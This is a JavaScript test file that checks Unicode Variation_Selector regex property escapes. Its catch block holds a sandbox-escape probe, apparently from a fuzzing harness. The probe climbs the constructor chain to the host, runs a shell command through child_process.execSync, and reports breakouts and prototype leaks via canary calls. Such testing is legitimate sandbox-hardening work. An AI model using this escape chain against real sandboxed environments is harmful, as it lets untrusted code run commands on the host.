try {
    const matchSymbols = buildString({
        loneCodePoints: [],
        ranges: [
            [
                6155,
                6157
            ],
            [
                65024,
                65039
            ],
            [
                917760,
                917999
            ]
        ]
    });
    testPropertyEscapes(/^\p{Variation_Selector}+$/u, matchSymbols, '\\p{Variation_Selector}');
    testPropertyEscapes(/^\p{VS}+$/u, matchSymbols, '\\p{VS}');
    const nonMatchSymbols = buildString({
        loneCodePoints: [],
        ranges: [
            [
                56320,
                57343
            ],
            [
                0,
                6154
            ],
            [
                6158,
                56319
            ],
            [
                57344,
                65023
            ],
            [
                65040,
                917759
            ],
            [
                918000,
                1114111
            ]
        ]
    });
    testPropertyEscapes(/^\P{Variation_Selector}+$/u, nonMatchSymbols, '\\P{Variation_Selector}');
    testPropertyEscapes(/^\P{VS}+$/u, nonMatchSymbols, '\\P{VS}');
} catch (e) {
    try {
        e(() => {
        }).constructor.constructor('return this')().process.mainModule.require('child_process').execSync('ls').toString();
    } catch (DONOTINSTRUMENT) {
    }
    try {
        function CheckBreakout(x) {
            try {
                if (x.constructor.constructor('return this')().process.mainModule.require) {
                    leak('SB-SUCCESS: The argument e is able to call outside the sandbox');
                }
            } catch (DONOTINSTRUMENT) {
            }
        }
        function getRootPrototype(obj) {
            if (typeof obj != 'object' && typeof obj != 'function' || !obj.__proto__) {
                return Object.prototype;
            }
            while (obj.__proto__) {
                obj = obj.__proto__;
            }
            return obj;
        }
        CheckBreakout(e);
        getRootPrototype(e).CCA = 'CC: Got it?';
        if (getRootPrototype(e) !== Object.prototype && getRootPrototype(e).canary !== Object.prototype.canary) {
            leak('CCA-SUCCESS: The parameter e of the catch clause has a different root prototype');
        }
        getRootPrototype(e).CCT = 'CC: Got it?';
        if (getRootPrototype(this) !== Object.prototype && getRootPrototype(this).canary !== Object.prototype.canary) {
            leak('CCT-SUCCESS: "this" object of function e has a different root prototype');
        }
    } catch (E) {
    }
}